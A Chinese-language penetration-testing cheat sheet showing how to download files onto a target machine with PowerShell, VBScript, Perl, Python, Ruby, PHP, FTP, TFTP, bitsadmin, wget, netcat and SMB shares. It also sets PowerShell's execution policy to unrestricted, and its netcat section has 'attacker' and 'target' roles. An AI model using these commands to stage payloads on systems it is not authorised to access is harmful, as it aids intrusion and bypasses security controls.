终端方式下载文件


Powershell

创建如下PSL脚本：

$p = New-Object System.Net.WebClient 
$p.DownloadFile("http://domain/file","C:%homepath%file")

执行：

PS C:> .test.ps1

如果Powershell禁止执行了，使用如下命令：

C:>powershell set-executionpolicy unrestricted

Visual Basic

创建如下VBS脚本。

Set args = Wscript.Arguments
Url = "http://domain/file"
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", Url, False
xHttp.Send
with bStrm
    .type = 1 '
    .open
    .write xHttp.responseBody
    .savetofile " C:\%homepath%\file", 2 '
end with

执行：

C:>cscript test.vbs

Perl

脚本如下:

#!/usr/bin/perl 
use LWP::Simple; 
getstore("http://domain/file", "file");

执行：

root@kali:~# perl test.pl

Python

脚本如下：

#!/usr/bin/python 
import urllib2 
u = urllib2.urlopen('http://domain/file') 
localFile = open('local_file', 'w') 
localFile.write(u.read()) 
localFile.close()

执行：

root@kali:~# python test.py

Ruby

脚本如下：

#!/usr/bin/ruby
require 'net/http'
Net::HTTP.start("www.domain.com") { |http|
r = http.get("/file")
open("save_location", "wb") { |file|
file.write(r.body)
}
}

执行：

root@kali:~# ruby test.rb

PHP

脚本如下：

#!/usr/bin/php 
<?php $data = @file("http://example.com/file");
$lf = "local_file";         
$fh = fopen($lf, 'w');         
fwrite($fh, $data[0]);         
fclose($fh); 
?>

执行：

root@kali:~# php test.php

FTP

执行如下命令：

ftp 127.0.0.1 username password get file exit

TFTP

执行如下命令：

tftp -i host GET C:%homepath%file location_of_file_on_tftp_server

Bitsadmin

执行如下命令：

bitsadmin /transfer n http://domain/file c:%homepath%file

Wget

执行如下命令：

wget http://example.com/file
这里建议用Linux下：wget http://example.com/file.tar.gz，Windows：wget http://example.com/test/file.php，这样下载的干净

Netcat

attacker执行如下命令：

cat file | nc -l 1234

target执行：

nc host_ip 1234 > file

Window 文件共享

使用如下命令:

net use x: \127.0.0.1\share /user:example.comuserID myPassword
